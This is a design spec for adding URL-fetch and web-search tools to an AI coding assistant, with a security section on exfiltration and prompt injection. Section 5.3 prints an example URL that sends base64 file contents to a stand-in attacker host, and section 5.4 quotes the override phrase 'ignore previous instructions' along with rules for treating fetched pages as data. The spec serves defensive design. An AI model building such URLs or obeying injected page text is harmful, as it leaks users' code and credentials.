# Feature Spec: External Reference Retrieval

Status: Not started
Order: 51 of 53
Plan: `docs/PLAN/03_phase_3_code_understanding.md`, Phase 3, Work
Package 8 (Should). That directory is local-only and not committed, so the
reference is a name rather than a link; this spec is self-contained.
Depends on: [#20](20_working_modes.md) (the mode that gates the tool) — **not
built**; [#26](26_context_assembly.md) (the category and budget fetched content
enters) — **not built**. Everything else named below is a cross-reference, not
a prerequisite.
Related spec sections: `ai_coding_assistant_specification.md` section 7.10
(secret detection), section 19 (open gaps).
Related implementation specs:
[`12_web_app_troubleshooting.md`](12_web_app_troubleshooting.md) (browser
diagnostics for the user's own local app — a different capability with a
different trust model, see §4),
[`26_context_assembly.md`](26_context_assembly.md) (the category and budget this
content enters through),
[`27_context_inspector.md`](27_context_inspector.md) (where a user sees and
removes it),
[`30_memory_retrieval_and_lifecycle.md`](30_memory_retrieval_and_lifecycle.md)
(the injection-resistance pattern this follows rather than reinvents),
[`10_persistent_command_approval.md`](10_persistent_command_approval.md) and
[`34_repository_config_trust_boundary.md`](34_repository_config_trust_boundary.md)
(the approval scope rules the allowlist obeys),
[`33_mcp_management_and_deferred_discovery.md`](33_mcp_management_and_deferred_discovery.md)
(the alternative this spec argues against in §5.1).

## 1. Motivation

Damaian cannot read a page. Not a library's documentation, not a changelog, not
an error message someone else already explained, not the RFC that says what the
header means.

Every task touching a third-party API therefore runs on whatever the model
remembers, and what a model remembers about a fast-moving library is a mixture
of several versions with no marker saying which. The failure is not that the
agent says "I don't know" — it is that it writes a confident call against an API
that changed, and the user finds out at `cargo build`. [Spec 23](23_verification_loop.md)
will catch a compile error; it will not catch a semantically valid call to a
deprecated endpoint.

The gap is invisible in the current metric set because no scenario asks for it.
Every mainstream agent tool has some form of URL reading, and the reason is not
completeness — it is that the model's knowledge has a date on it and the
repository it is working in does not.

This is Should-tier rather than Must-tier for an honest reason: Damaian is
useful without it, and it is the one capability in this phase that opens a
genuinely new attack surface. §5.3 is the part of this spec that matters.

## 2. Current State

- **No tool reaches the network for content.** The model-facing set is
  `read_file`, `search_codebase`, `run_command`, `propose_patch`,
  `read_git_diff`, `read_git_status`, `inspect_web_page`, `run_web_scenario`,
  `propose_plan`, `complete_step`. The two web tools drive a browser against the
  user's own running application ([spec 12](12_web_app_troubleshooting.md)); they
  are diagnostics, not a reader.
- **`run_command` is the accidental path.** A user who has approved `curl` once
  has given the agent the whole internet through the command allowlist, with no
  provenance, no budget, no redaction of what goes out, and no record that the
  content came from outside. That this works today is an argument for specifying
  it, not against.
- **`ContextItem` is `{ kind, path, content, tokens, redaction_status }`.**
  `kind` is a free string and `path` is an `Option<String>`, so a non-file source
  has somewhere to live, but nothing distinguishes trusted repository content
  from anything else.
- **Config scope is enforced.** [Spec 34](34_repository_config_trust_boundary.md)
  gave `apply_overlay_scoped` a `ConfigScope` of `User`, `Repository` or `Admin`,
  a forbidden-key list, and restrict-only merges for repository scope. The
  machinery a domain allowlist needs already exists.
- **Outbound network already happens**, to one place: `CurlModelTransport` posts
  to the configured `base_url` with the API key in an `authorization` header.
- **`SecretScanner` is applied on the way in** to the audit log and to command
  output. Nothing scans anything on the way *out*, because until now nothing
  chose a destination.

## 3. Requirements

1. A tool fetches the content of a URL the model names, returning bounded,
   text-converted, redacted content.
2. Web search exists as a separate tool that is unavailable until the user
   configures a search provider, and is never a prerequisite for requirement 1.
3. Fetched content enters the model's context as a distinct, provenance-labelled
   category at the lowest priority, is visible and removable in
   [spec 27](27_context_inspector.md), and counts against the same context and
   token budgets as everything else.
4. **Fetched content is data and can never be an instruction.** This is proven
   by prompt-injection evaluations, not by a design argument.
5. A host is fetched only after the user has approved it. Approval is recorded
   in **user** scope and a repository can never grant it.
6. A URL is treated as an outbound channel: what leaves in a request is
   constrained and shown to the user before it leaves.
7. No content is fetched as a side effect of other content — no link following,
   no redirect to a new host, no sub-resource loading.
8. Every fetch is audited with its URL, host, status, size and approval basis,
   and the fetched body is stored redacted with its hash and time.

## 4. Non-goals

- **Crawling.** One URL, one request, one response. Requirement 7 is what keeps
  this a reader rather than a crawler, and it is also why robots directives are
  out of scope: there is nothing to crawl.
- **Rendering pages in a browser.** [Spec 12](12_web_app_troubleshooting.md)'s
  browser drives the user's own application on localhost. Pointing it at
  arbitrary internet pages would run untrusted JavaScript in a context that has
  the user's repository open, which is a categorically larger risk than an HTTP
  GET and buys only prettier text.
- **Authenticated fetching.** No cookies, no credentials, no bearer tokens, no
  session reuse. A page behind a login is out of reach, and that is the correct
  answer rather than a limitation to fix later.
- **Replacing MCP.** A user who prefers an MCP fetch server may still add one;
  [spec 33](33_mcp_management_and_deferred_discovery.md) governs it. §5.1 says
  why a native tool is specified anyway.
- **Caching as a knowledge base.** Fetched pages are cached to avoid re-fetching
  within a session, not to build a corpus. No index, no embeddings, no recall
  across sessions — that is memory, and it has [spec 29](29_memory_creation_and_consent.md)'s
  consent rules, which content from a web page cannot satisfy.
- **Downloading files.** The tool returns text. It does not write to the
  repository, and it is not a package installer.
- **Summarising fetched content with a second model call.** Bounded extraction
  ([§5.5](#55-what-comes-back)) is deterministic; a summarisation pass would add
  cost, latency and a second place for injected text to be laundered into
  something that looks like Damaian's own words.

## 5. Design

### 5.1 Why a native tool rather than an MCP server

[Spec 33](33_mcp_management_and_deferred_discovery.md) makes MCP servers
manageable, and a fetch server is available off the shelf. Specifying a native
tool anyway is a deliberate choice with three reasons, each of which is a
property this spec needs and MCP cannot give:

- **A remote server's read-only claim is an assertion.** Spec 33 says so
  explicitly — a claim "cannot lower an approval requirement". An MCP fetch tool
  would arrive with its own description of what it does, and Damaian would have
  to gate it as an unknown. The exfiltration constraints in §5.3 have to be
  enforced by the thing that builds the request.
- **Provenance has to survive into context.** Requirement 3 needs the content
  labelled at the point it is produced. An MCP tool result is a string.
- **Accounting.** [Spec 19](19_token_and_cost_accounting/proposal.md) and
  [spec 26](26_context_assembly.md) budget what enters a request. Content
  arriving through a generic tool result is outside both.

A user who adds an MCP fetch server still gets spec 33's treatment. This spec
does not block that; it declines to rely on it.

### 5.2 The tools

```rust
pub struct FetchUrlInput {
    /// Absolute http(s) URL. No other scheme is accepted.
    pub url: String,
}

pub struct SearchWebInput {
    pub query: String,
    /// Bounded; the provider's own cap applies on top.
    pub max_results: Option<u8>,
}
```

`search_web` is registered only when the user has configured a search provider —
an endpoint and an API key in user scope, on the same footing as a model
provider. Absent that, the tool is not in the tool list at all, for the reason
[spec 50](50_model_initiated_clarification.md) §5.4 gives: a tool the model can
see is a tool it plans around.

`search_web` returns titles, URLs and snippets. It never returns page bodies —
fetching one is a separate call with its own approval, so a search cannot
produce content from a host the user has not approved.

### 5.3 A URL is an exfiltration channel

This is the section that justifies the spec being Should-tier and reviewed
carefully.

A fetch is the first tool in Damaian that lets the model choose **what leaves
the machine**. `run_command` already does in principle, which is why `curl` sits
behind approval; the difference is that this tool is *for* making network
requests, so "it made a network request" cannot itself be the signal. The model
supplies a string, and a string can carry data:

```
https://attacker.example/collect?d=<base64 of a file the agent just read>
```

Nothing about that request looks anomalous. It is a GET to a host, and the body
of the response is irrelevant to the attacker. The threat is not hypothetical in
the way it sounds, because the instruction to make it need not come from the
user: it can come from a repository file, an `AGENTS.md`, an MCP tool
description, or — once this spec exists — a previously fetched page. That is the
prompt-injection chain [spec 30](30_memory_retrieval_and_lifecycle.md) already
takes seriously for memory, and this is the same chain with a network endpoint at
the end of it.

Five constraints, and none of them is optional:

1. **Host approval, per host, in user scope.** The first fetch of a host asks.
   The dialog shows the **host prominently and the full URL verbatim**, not a
   shortened or prettified form. `Allow Always` records the host in user config
   keyed by repository, exactly as [spec 34](34_repository_config_trust_boundary.md)
   relocated `command_allowlist`. `web_domain_allowlist` joins the
   forbidden-for-repository key list, so a repository can never add a host —
   this is the same defect class spec 34 closed for `model_base_url`, and it
   would be a regression to reopen it here.
2. **The query string is shown, and a large one is flagged.** A URL whose query
   or fragment exceeds a modest byte threshold is displayed with that component
   broken out and marked, because a long opaque parameter is the shape of
   exfiltration and a user scanning a dialog will not spot it inside a long line.
   The threshold is a display rule, not a block: legitimate URLs have long
   parameters.
3. **Repository content in a URL is refused, not flagged.** Before the request
   is built, the URL's query and fragment are checked against the
   `SecretScanner` and against the content of files read during this task. A
   match refuses the fetch outright with an error the model sees. A fetch is
   never the way a key leaves the machine, and no approval dialog should be the
   last line of defence against it — requirement 6 is enforced before the user
   is asked, not by asking.
4. **No redirect to a new host is followed.** curl is invoked without
   `--location`. A 3xx is returned to the model as a result stating the target,
   which it may fetch as a new call — with that host's own approval. An approved
   host that redirects to an unapproved one is the cheapest bypass of
   constraint 1, and following redirects silently would ship it.
5. **Nothing is fetched automatically.** Requirement 7. Links inside a fetched
   page are text; sub-resources are not loaded; a search result is not fetched
   because it was returned. Every request is a tool call the model made and the
   user's allowlist permitted.

The outbound request carries no `authorization` header, no cookies, and no
Damaian identity beyond a plain user agent. `CurlModelTransport` is not reused —
it exists to send an API key to a configured base URL, and the one thing this
transport must never do is send that key anywhere. A separate, smaller transport
with no credential field makes that unrepresentable rather than merely untrue.

### 5.4 Fetched content is data

Requirement 4, following [spec 30](30_memory_retrieval_and_lifecycle.md)'s
treatment of memory rather than inventing a second approach:

- It enters as a `ContextItem` with a distinct kind and an explicit provenance
  label naming the URL and the fetch time, in the **lowest-priority category**
  of [spec 26](26_context_assembly.md)'s allocation — so a crowded context drops
  a fetched page before it drops repository code.
- It is delimited and labelled in the request as retrieved external content,
  never merged into the system prompt, never presented as instructions, and
  never placed where repository instructions ([spec 11](11_agents_md_support.md))
  live.
- It is visible in [spec 27](27_context_inspector.md)'s inspector with its URL,
  and removable there.
- **Instruction-shaped fetched content is not obeyed and is reported.** A page
  containing "ignore previous instructions", a fake tool call, or text
  impersonating the user or the system is content the model is told to treat as
  quoted material. Where the engine detects the shape, it is marked in the
  inspector, because a user debugging a strange turn should be able to see that
  a page tried something.

And the rule spec 30 establishes, restated because it is the acceptance
criterion: this is settled by **prompt-injection evaluations in
[spec 18](18_local_evaluation_harness/proposal.md)'s harness**, with fixture
pages that attempt to redirect the agent, exfiltrate a seeded credential, and
induce an unapproved command. A design argument is not evidence.

### 5.5 What comes back

| Rule | Value |
|---|---|
| Response size cap | Bounded; a larger response is truncated with the truncation stated in the result |
| Content types | `text/*`, `application/json`, `application/xhtml+xml`. Anything else returns its type and size, not its bytes |
| Conversion | HTML reduced to text deterministically — headings, paragraphs, lists, code blocks, link text; scripts, styles, and attributes dropped |
| Redaction | `SecretScanner` before storage and before the content reaches the model |
| Timeout | A connect and a total ceiling, as `CurlModelTransport` already sets |
| Cancellation | `CancelToken` polled, so a stop interrupts a fetch ([spec 08](08_stop_and_progress.md)) |

Inbound redaction is not paranoia about the page — it is that a code sample on a
documentation site frequently contains a key-shaped string, and an unredacted
one would flow into the session log, the transcript and later a task report.

The body is cached under the data directory keyed by URL hash, with the URL,
fetch time, status and content hash recorded. Within a session a repeat fetch of
the same URL is served from cache and says so; across sessions the cache is not
consulted, because a stale page presented as current is the failure mode this
whole spec exists to prevent.

### 5.6 Budget

Fetched content counts against [spec 26](26_context_assembly.md)'s context
budget in its own category, and the tool call counts a round against
[spec 21](21_task_plan_progress_and_budget/proposal.md)'s ceiling. A per-turn cap
on fetches bounds the worst case — a model that fetches twelve pages has lost
the thread, and the cap turns that into a refusal the model can read rather than
a bill.

### 5.7 Documentation

`docs/USER_GUIDE.md`: what the agent can read, that every host is approved once,
where fetched content appears in the context inspector, and that nothing behind
a login is reachable. `docs/TROUBLESHOOTING.md`: why a fetch was refused — an
unapproved host, a redirect, a blocked content type, a URL carrying repository
content — with the refusal wording for each.

## 6. Acceptance Criteria

- A documentation URL fetches, converts to text, and appears in the context
  inspector labelled with its URL and fetch time.
- A host with no approval is refused, and approving it once permits later
  fetches of that host and no other.
- A repository config setting `web_domain_allowlist` is rejected as a forbidden
  key, and the rejection is reported through the existing
  `RepositoryConfigReport` — asserted by test.
- A URL whose query carries a seeded credential, or content from a file read
  earlier in the task, is refused **before** any approval dialog is shown.
- A 3xx to a different host is not followed; the result states the target and
  fetches nothing.
- No outbound fetch carries the model API key or any cookie — asserted against
  the constructed request.
- A page containing an injection attempt does not change the agent's behaviour,
  asserted by harness scenarios covering instruction override, credential
  exfiltration, and induced command execution.
- Fetched content is dropped before repository content when the context budget
  is exceeded.
- A secret-shaped string in a fetched page never reaches the session log, the
  transcript or the model unredacted.
- A non-text content type returns its type and size rather than its bytes.
- A stop during a fetch takes effect during the fetch.
- `search_web` is absent from the tool list when no search provider is
  configured, and a search result is never fetched automatically.
- Every fetch is audited with URL, host, status, size and approval basis.
- Every quality-gate command from `AGENTS.md` passes.

## 7. Implementation Notes

To be completed during implementation. Record:

- Which injection fixtures were written, and whether any of them worked before
  being fixed. A suite where nothing ever succeeded was probably too gentle.
- Whether the "repository content in a URL" check (§5.3 constraint 3) produced
  false positives in normal use, and what the threshold ended up being. A check
  that blocks legitimate fetches will be disabled by whoever hits it, so its
  calibration matters more than its existence.
- Whether the deterministic HTML-to-text conversion was good enough on real
  documentation sites, and where it was not.
